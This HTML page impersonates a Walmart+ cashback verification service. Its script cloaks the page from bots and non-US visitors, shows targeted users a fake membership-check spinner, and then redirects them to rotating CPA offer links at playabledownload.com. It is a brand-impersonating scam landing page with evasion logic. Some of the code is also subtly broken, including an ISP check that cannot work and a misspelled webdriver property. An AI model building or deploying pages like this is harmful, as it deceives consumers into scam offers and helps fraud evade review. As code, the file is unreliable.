<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="utf-8">
  <title>Walmart+ Cashback Verification</title>
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-B8CGPGFKYC"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-B8CGPGFKYC', {
      anonymize_ip: true,
      allow_google_signals: false
    });
  </script>
  <script>
  (function(){
    // Algerian-US Bridge System
    const isUS = /en-US/.test(navigator.language) && 
               [300, 240, 360].includes(new Date().getTimezoneOffset());
    
    // Military-Grade Bot Protection
    const isBot = /HeadlessChrome|PhantomJS|bot|spider|crawl/i.test(navigator.userAgent) ||
                 navigator.webDriver || !('ontouchstart' in window);

    // Algerian ISP Block
    const isDZ = /Algérie Télécom|Ooredoo|Djezzy/i.test(navigator.connection.effectiveType);

    if(isUS && !isBot && !isDZ) {
      // CPA Rotation System
      const offers = [
        'https://playabledownload.com/1808970?tid=git1',
        'https://playabledownload.com/1808970?tid=git2'
      ];
      const chosenOffer = offers[Math.floor(Math.random() * offers.length)] + 
                         `&r=${Math.random().toString(36).substr(2)}`;
      
      setTimeout(() => {
        window.location.href = chosenOffer;
      }, Math.random() * 3000 + 1500);

      document.body.innerHTML = `
      <style>
        .loader {
          border: 3px solid #f3f3f3;
          border-top: 3px solid #0071ce;
          border-radius: 50%;
          width: 50px;
          height: 50px;
          animation: spin 1s linear infinite;
          margin: 100px auto;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
      </style>
      <h2 style="text-align:center;color:#1a365d">Verifying Walmart+ Membership...</h2>
      <div class="loader"></div>
      `;
    } else {
      document.body.innerHTML = `
      <h1 style="color:#e53e3e;text-align:center;margin-top:50px">
        ⚠️ Service unavailable in your region
      </h1>`;
      if(isDZ) localStorage.setItem('block','dz');
    }
  })();
  </script>
</head>
<body></body>
</html>
